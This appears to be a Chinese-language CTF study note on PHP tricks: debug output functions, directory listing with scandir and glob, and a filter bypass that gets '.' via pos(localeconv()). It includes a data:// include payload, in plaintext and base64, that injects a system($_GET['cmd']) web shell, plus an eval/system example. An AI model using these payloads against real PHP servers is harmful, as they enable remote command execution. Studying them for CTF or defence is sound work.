### 打印调试输出

| 对比维度          | `echo`                                 | `print_r()`                        | `var_dump()`                      |
| ------------- | -------------------------------------- | ---------------------------------- | --------------------------------- |
| **本质**        | 语言结构（非函数）                              | 内置函数                               | 内置函数                              |
| **主要用途**      | 输出字符串/数字                               | 格式化打印变量（侧重数组/对象）                   | 详细调试输出（含类型与长度）                    |
| **支持的数据类型**   | 字符串、数字（自动转换）  <br>⚠️ 数组/对象会报 `Warning` | 所有类型（数组/对象排版最佳）                    | 所有类型                              |
| **输出格式**      | 原始内容，无格式化                              | 缩进排版，人类易读                          | 带类型、长度、嵌套结构的详细 dump               |
| **是否显示类型/长度** | ❌ 否                                    | ❌ 否                                | ✅ 是                               |
| **布尔值处理**     | `true` → `1`，`false` → 空               | `true` → `1`，`false` → 空（静默）       | 明确输出 `bool(true)` / `bool(false)` |
| `NULL` 处理     | 输出空                                    | 输出空（静默）                            | 明确输出 `NULL`                       |
| **返回值**       | 无（`void`）                              | 默认返回 `true`；第二参数为 `true` 时返回格式化字符串 | 无（`void`）                         |
| **多参数支持**     | ✅ 支持（逗号分隔：`echo $a, $b;`）              | ❌ 仅支持单个变量                          | ✅ 支持（逗号分隔：`var_dump($a, $b);`）    |
| **典型使用场景**    | 页面渲染、CTF 回显简单字符串/命令结果                  | 快速查看数组/对象结构、CTF 目录遍历结果收集           | 严格调试、类型排查、复杂数据结构/接口返回分析           |
| **性能开销**      | 极低                                     | 低                                  | 较高（递归遍历 + 类型计算）                   |

```php
// 简单输出
echo();
// 带额外信息
print_r();
var_dump();
```

### 读取目录
| 项目       | 说明                                                                                                                |
| -------- | ----------------------------------------------------------------------------------------------------------------- |
| **函数签名** | `scandir(string $directory, int $sorting_order = SCANDIR_SORT_ASCENDING, resource $context = null): array\|false` |
| **功能**   | 返回指定目录中的文件和目录列表                                                                                                   |
| **返回值**  | 成功时返回包含文件名的数组；失败时返回 `false`                                                                                       |

| 项目       | 说明                                                    |
| -------- | ----------------------------------------------------- |
| **函数签名** | `glob(string $pattern, int $flags = 0): array\|false` |
| **功能**   | 根据 shell 风格的通配符模式搜索匹配的文件路径                            |
| **返回值**  | 成功时返回匹配文件路径的数组；失败时返回 `false`                          |

```php
// 扫当前目录
var_dump(glob("*"));
print_r(scandir(pos(localeconv())));
```

### 用 `?>` 代替分号 
只有末尾块的代码可以代替分号
```php
<?php
echo 1
?>          // ✅ 正确，?> 隐式补全了分号，输出 1

<?php
$a = 1;
$b = 2
?>          // ✅ 正确，等价于 $b = 2; ?>
```

可以将其传入 `eval()` ，不一定需要 `<?php`
```php
eval("system('ls')?>");
// 和 eval("system('ls');"); 一样
```

### 可省略括号的语言结构

| 结构                              | 说明               | 示例                                 |
| ------------------------------- | ---------------- | ---------------------------------- |
| `echo`                          | 输出一个或多个字符串（无返回值） | `echo "Hello";` / `echo("Hello");` |
| `print`                         | 输出字符串（始终返回 `1`）  | `print "Hello";`                   |
| `include` / `require`           | 引入文件（失败时行为不同）    | `include "config.php";`            |
| `include_once` / `require_once` | 仅引入一次            | `require_once "db.php";`           |
| `exit` / `die`                  | 终止脚本执行           | `exit 1;` / `die("Error");`        |

### 用 `data://` 来 url_include
| 函数/指令                                          | PHP 7.4 及更早                | PHP 8.0+                  |
| ---------------------------------------------- | -------------------------- | ------------------------- |
| `include 'data://...'` / `require`             | 需开启 `allow_url_include=On` | ❌ **彻底移除**，不再支持代码包含       |
| `file_get_contents()` / `fopen()` / `stream_*` | ✅ 支持                       | ✅ 仍支持（**仅只读，不解析 PHP 代码**） |
```php
include($_GET['c']);
/*
# 明文
?c=data://text/plain,<?php system($_GET['cmd']);?>
# base64编码
# <?php system($_GET['cmd']); ?>
?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
# <?php echo(123); ?>
?c=data://text/plain;base64,PD9waHAgZWNobygxMjMpOyA/Pg==
/*
```

### `.` 的获取
| 函数             | 官方作用                         | 返回值                                                            | CTF 中的核心用途                                           |
| -------------- | ---------------------------- | -------------------------------------------------------------- | ---------------------------------------------------- |
| `localeconv()` | 返回本地数字/货币格式配置数组              | 关联数组，如 `['decimal_point' => '.', 'thousands_sep' => ',', ...]` | **无点号获取 `.`**。数组第一个值固定是小数点符号 `"."`，完美替代被过滤的 `.`      |
| `pos()`        | `current()` 的别名，返回数组当前指针指向的值 | 混合类型（默认指向第一个元素）                                                | 配合 `localeconv()` 提取第一个值：`pos(localeconv())` → `"."` |
```php
# 这就是 .
pos(localeconv())
```

### 数组相关

#### 数组指针操作

| 函数          | 说明                       | 返回值                          |
| ----------- | ------------------------ | ---------------------------- |
| `current()` | 返回指针当前所指的元素值             | 当前元素的值，指针越界返回 `false`        |
| `key()`     | 返回指针当前所指元素的键名            | 当前元素的键，指针越界返回 `null`         |
| `next()`    | 将指针向前移动一位，并返回该位置的值       | 下一个元素的值，越界返回 `false`         |
| `prev()`    | 将指针向后移动一位，并返回该位置的值       | 上一个元素的值，越界返回 `false`         |
| `reset()`   | 将指针重置到数组**第一个**元素，并返回其值  | 第一个元素的值，空数组返回 `false`        |
| `end()`     | 将指针移动到数组**最后一个**元素，并返回其值 | 最后一个元素的值，空数组返回 `false`       |
| `each()`    | 返回当前元素的键值对，并将指针前移一位      | 数组（PHP 7.2 起已废弃，PHP 8.0 起移除） |
